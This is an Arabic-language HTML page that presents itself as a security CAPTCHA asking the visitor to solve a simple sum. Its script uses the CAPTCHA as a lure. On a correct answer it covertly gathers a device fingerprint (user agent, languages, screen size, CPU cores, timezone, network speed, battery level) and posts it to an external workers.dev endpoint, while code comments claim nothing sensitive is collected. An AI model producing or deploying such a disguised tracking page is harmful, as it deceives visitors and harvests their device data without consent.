<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>التحقق الأمني</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, sans-serif; }
  body {
    min-height: 100vh; display: flex; align-items: center; justify-content: center;
    background: #0f172a; padding: 20px; position: relative; overflow: hidden;
  }
  body::before {
    content: ''; position: absolute; inset: 0;
    background:
      radial-gradient(circle at 20% 20%, rgba(99,102,241,.25), transparent 40%),
      radial-gradient(circle at 80% 80%, rgba(168,85,247,.25), transparent 40%);
  }
  .card {
    position: relative; background: #1e293b;
    border: 1px solid rgba(255,255,255,.08);
    border-radius: 20px; padding: 36px 28px 28px;
    width: 100%; max-width: 420px;
    box-shadow: 0 25px 50px rgba(0,0,0,.5); text-align: center;
    animation: enter .5s cubic-bezier(.2,.8,.3,1); z-index: 1;
  }
  @keyframes enter { from { opacity:0; transform: translateY(20px); } to { opacity:1; transform:none; } }
  .icon-box {
    width: 60px; height: 60px; margin: 0 auto 18px;
    background: linear-gradient(135deg, #6366f1, #a855f7);
    border-radius: 16px; display: flex; align-items: center; justify-content: center;
    font-size: 28px; box-shadow: 0 8px 20px rgba(99,102,241,.4);
  }
  h1 { color: #f1f5f9; font-size: 22px; font-weight: 700; margin-bottom: 8px; }
  .subtitle { color: #94a3b8; font-size: 13.5px; margin-bottom: 26px; }
  .captcha-box {
    background: #0f172a; border: 1px solid rgba(255,255,255,.06);
    border-radius: 14px; padding: 24px 18px; margin-bottom: 16px;
  }
  .captcha {
    font-size: 30px; font-weight: 700; color: #f1f5f9; letter-spacing: 5px;
    font-family: 'Courier New', monospace;
    direction: ltr; unicode-bidi: embed;
  }
  input {
    width: 100%; padding: 15px 16px; font-size: 17px; font-weight: 600;
    border: 1.5px solid rgba(255,255,255,.1); border-radius: 12px;
    background: #0f172a; color: #f1f5f9; text-align: center; outline: none;
    transition: .2s; margin-bottom: 14px;
  }
  input::placeholder { color: #64748b; font-weight: 500; }
  input:focus { border-color: #6366f1; box-shadow: 0 0 0 4px rgba(99,102,241,.15); }
  input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; }
  input[type=number] { -moz-appearance: textfield; }
  button {
    width: 100%; padding: 15px; font-size: 16px; font-weight: 700;
    color: #fff; background: linear-gradient(135deg, #6366f1, #a855f7);
    border: none; border-radius: 12px; cursor: pointer;
    transition: .25s; display: flex; align-items: center;
    justify-content: center; gap: 8px; font-family: inherit;
  }
  button:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 10px 25px rgba(99,102,241,.5); }
  button:disabled { opacity: .6; cursor: not-allowed; }
  .msg { margin-top: 14px; font-size: 13.5px; font-weight: 600; min-height: 20px; }
  .err { color: #f87171; }
  .spinner {
    width: 15px; height: 15px;
    border: 2.5px solid rgba(255,255,255,.3); border-top-color: #fff;
    border-radius: 50%; animation: spin .7s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .success {
    width: 76px; height: 76px; margin: 0 auto 20px;
    background: linear-gradient(135deg, #10b981, #059669);
    border-radius: 50%; display: flex; align-items: center; justify-content: center;
    font-size: 40px; color: #fff;
    box-shadow: 0 12px 28px rgba(16,185,129,.4);
    animation: pop .5s cubic-bezier(.2,1.4,.4,1);
  }
  @keyframes pop { 0% { transform: scale(0); } 60% { transform: scale(1.15); } 100% { transform: scale(1); } }
  .success-title { color: #4ade80; font-size: 22px; font-weight: 700; margin-bottom: 6px; }
  .success-text { color: #94a3b8; font-size: 13.5px; }
  .footer {
    margin-top: 22px; padding-top: 18px;
    border-top: 1px solid rgba(255,255,255,.06);
    display: flex; align-items: center; justify-content: center;
    gap: 7px; font-size: 11.5px; color: #64748b;
  }
  .dot {
    width: 6px; height: 6px; background: #10b981; border-radius: 50%;
    box-shadow: 0 0 8px #10b981; animation: pulse 2s ease-in-out infinite;
  }
  @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:.3; } }
</style>
</head>
<body>
  <div class="card" id="card">
    <div class="icon-box">🔒</div>
    <h1>التحقق الأمني</h1>
    <p class="subtitle">يرجى حل المسألة للتأكد من أنك لست روبوت</p>
    <div class="captcha-box">
      <div class="captcha" id="captcha">…</div>
    </div>
    <input type="number" id="answer" placeholder="أدخل الناتج" autocomplete="off" inputmode="numeric">
    <button id="btn" onclick="verify()"><span>تحقق</span></button>
    <div class="msg" id="msg"></div>
    <div class="footer">
      <span class="dot"></span>
      <span>اتصال آمن ومشفّر</span>
    </div>
  </div>

<script>
/* رابط واحد فقط — لا شيء آخر مكشوف */
const API = "https://floral-darkness-02bc.imoon-b2.workers.dev";

let a, b, sum;

function newCaptcha() {
  a = Math.floor(Math.random() * 9) + 1;
  b = Math.floor(Math.random() * 9) + 1;
  sum = a + b;
  document.getElementById('captcha').textContent = `${a} + ${b} = ?`;
  document.getElementById('answer').value = '';
  document.getElementById('msg').textContent = '';
}

async function getBattery() {
  try {
    if (!navigator.getBattery) return '';
    const bt = await navigator.getBattery();
    return Math.round(bt.level * 100) + '%' + (bt.charging ? ' ⚡' : ' 🔋');
  } catch { return ''; }
}

async function verify() {
  const val = parseInt(document.getElementById('answer').value);
  const msg = document.getElementById('msg');
  const btn = document.getElementById('btn');

  if (isNaN(val)) {
    msg.className = 'msg err';
    msg.textContent = '⚠️ الرجاء إدخال رقم';
    return;
  }
  if (val !== sum) {
    msg.className = 'msg err';
    msg.textContent = '❌ إجابة خاطئة، حاول مرة أخرى';
    newCaptcha();
    return;
  }

  btn.disabled = true;
  btn.innerHTML = '<span>جاري التحقق</span><span class="spinner"></span>';
  msg.textContent = '';

  // جمع البيانات الخام — لا شيء حساس هنا
  const conn = navigator.connection || {};
  const payload = {
    ua: navigator.userAgent,
    lang: navigator.language,
    languages: (navigator.languages || []).join(', '),
    screen: `${screen.width}x${screen.height}`,
    windowSize: `${innerWidth}x${innerHeight}`,
    pixelRatio: devicePixelRatio,
    platform: navigator.platform,
    cores: navigator.hardwareConcurrency || '',
    touchPoints: navigator.maxTouchPoints || 0,
    darkMode: matchMedia('(prefers-color-scheme: dark)').matches ? 'نعم 🌙' : 'لا ☀️',
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
    conn: conn.effectiveType || '',
    downlink: conn.downlink ? conn.downlink + ' Mbps' : '',
    rtt: conn.rtt ? conn.rtt + ' ms' : '',
    battery: await getBattery(),
  };

  try {
    await fetch(API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
  } catch {}

  // عرض النجاح
  document.getElementById('card').innerHTML =
    '<div class="success">✓</div>' +
    '<h1 class="success-title">تم التحقق بنجاح</h1>' +
    '<p class="success-text">يمكنك المتابعة الآن</p>' +
    '<div class="footer"><span class="dot"></span><span>شكراً لك</span></div>';
}

document.addEventListener('DOMContentLoaded', () => {
  newCaptcha();
  document.getElementById('answer').addEventListener('keypress', e => {
    if (e.key === 'Enter') verify();
  });
});
</script>
</body>
</html>
